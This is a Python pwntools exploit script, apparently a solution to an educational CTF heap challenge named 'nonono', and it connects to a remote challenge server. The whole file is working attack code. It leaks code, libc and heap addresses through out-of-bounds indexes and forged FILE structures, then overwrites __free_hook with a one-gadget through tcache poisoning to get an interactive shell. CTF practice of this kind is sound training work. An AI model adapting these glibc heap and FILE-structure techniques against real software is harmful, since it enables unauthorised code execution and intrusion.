from pwn import *

r = remote('eductf.zoolab.org', 20005)
# r = process('./nonono')

def add(idx, sz, data, silent=0):
    r.sendlineafter('>> ', '1')
    r.sendlineafter('IDX : ', str(idx))
    r.sendlineafter('SIZE : ', str(sz))
    if silent == 1:
        r.sendline(data)
    elif sz > 0:
        r.sendlineafter('CONTENT: ', data)

def show(idx):
    r.sendlineafter('>> ', '2')
    r.sendlineafter('IDX : ', str(idx))
    
def remove(idx):
    r.sendlineafter('>> ', '3')
    r.sendlineafter('IDX : ', str(idx))
 
def flag():
    r.sendlineafter('>> ', '4')

show(-7)
data = u64(r.recv(6).ljust(8, '\x00')) - 8
code = data - 0x202000
log.success('code: ' + hex(code))

add(2, 0x80, 'aaaa')

flag()

fs = p64(0xfbad1800) + p64(0)
fs += p64(0) + p64(0)
fs += p64(data-0x90) + p64(data+0x100)
fs += p64(data+0x100) + p64(data+0x100)
fs += p64(data+0x100) + p64(0)
fs += p64(0) + p64(0)
fs += p64(0) + p64(0)
fs += p64(1) + p64(0xffffffffffffffff)
fs += '\x00\x00\x00'

add(-4, 0x220, fs, 1)

r.recvuntil('===========================\n')
r.recvuntil('===========================\n')

libc = u64(r.recv(8)) - 0x97950
log.success('libc: ' + hex(libc))
free_hook = libc + 0x3ed8e8
onegadget = libc + 0x4f322 

r.recv(0xa8)
heap = u64(r.recv(8)) - 0x2f0
log.success('heap: ' + hex(heap))

r.sendlineafter('>> ', '4')

tmp = 0

fs = p64(0xfbad0000) + p64(tmp)
fs += p64(tmp) + p64(tmp)
fs += p64(tmp) + p64(tmp)
fs += p64(tmp) + p64(data+0x60)
fs += p64(data+0x60+0x20) + p64(0)
fs += p64(0) + p64(0)
fs += p64(0) + p64(0)
fs += p64(0) + p64(0xffffffffffffffff)
fs += '\x00\x00\x00'

add(0, 0x220, fs)
remove(0)
add(-2, 0x220, p64(heap+0x260))

add(9, 0x20, p64(heap+0x260)*3)

remove(2)
remove(6)

add(0, 0x80, p64(free_hook))
add(0, 0x80, p64(free_hook))
add(0, 0x80, p64(onegadget))

r.interactive()